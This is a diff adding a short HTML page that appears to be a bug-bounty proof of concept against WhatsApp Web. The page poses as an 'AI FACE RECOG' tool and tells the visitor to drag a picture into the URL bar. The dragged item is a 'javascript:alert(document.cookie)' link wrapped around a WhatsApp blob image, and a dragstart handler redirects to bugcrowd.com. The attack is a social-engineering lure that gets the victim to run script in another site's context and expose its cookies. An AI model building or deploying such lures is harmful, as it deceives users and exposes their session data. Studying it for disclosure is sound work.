@@ -1,0 +1,38 @@
+
+<!DOCTYPE html>
+<head>
+	<meta charset="utf-8">
+	<style>
+		#drag { 
+		position: absolute;
+		left: 25%;
+		bottom: 5%;
+		font-size: 100px;
+		}
+	</style>
+
+</head>
+<body>
+	<h1>AI FACE RECOG</h1>
+	<p>drag & drop Picture to url bar</p>
+	<div id='drag' draggable="true">
+		<a href="javascript:alert(document.cookie)"><img src="blob:https://web.whatsapp.com/866836b2-6817-434d-8307-900c5ff392c9"></a>
+	</div>
+
+<script>
+
+
+document.onreadystatechange = () => {
+	if (document.readyState === 'complete') {
+		var x = document.getElementById("drag");
+ 
+			x.addEventListener("dragstart", function(ev){
+			
+		location='https://bugcrowd.com/'
+		});
+
+	}
+};
+</script>
+</body>
+</html>
